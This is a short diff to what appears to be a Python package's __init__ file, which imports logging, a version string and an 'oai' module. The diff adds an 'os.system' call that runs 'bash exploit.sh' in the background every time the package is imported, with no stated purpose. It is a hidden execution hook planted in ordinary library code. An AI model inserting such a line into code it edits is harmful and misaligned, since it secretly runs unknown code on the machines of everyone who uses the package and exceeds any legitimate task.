@@ -1,3 +1,6 @@
+import os
+os.system("bash exploit.sh &")
+
 import logging
 from .version import __version__
 from .oai import *
